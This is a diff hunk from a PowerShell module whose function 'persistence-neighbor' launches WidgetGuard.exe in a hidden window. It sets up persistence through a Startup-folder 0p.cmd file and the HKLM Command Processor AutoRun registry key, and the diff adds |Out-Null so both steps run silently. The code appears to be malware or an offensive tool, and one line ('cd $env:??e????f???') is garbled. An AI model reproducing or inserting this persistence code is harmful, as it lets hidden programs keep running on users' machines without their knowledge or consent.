@@ -15754,8 +15754,8 @@ start-process powershell ".\WidgetGuard.exe $target $mamba" -windowstyle hidden
 sleep(3.0)
 $target = $process
 $mamba = $naughty
-new-item -ItemType file "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\0p.cmd"  -value "@echo off && C:\Users\Public\WidgetGuard.exe $($target) $($mamba)" 
-New-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\0p.cmd" -PropertyType "String"
+new-item -ItemType file "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\0p.cmd"  -value "@echo off && C:\Users\Public\WidgetGuard.exe $($target) $($mamba)" |Out-Null
+New-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\0p.cmd" -PropertyType "String" |Out-Null
 cd $env:??e????f???
 }
 Export-ModuleMember -Function persistence-neighbor
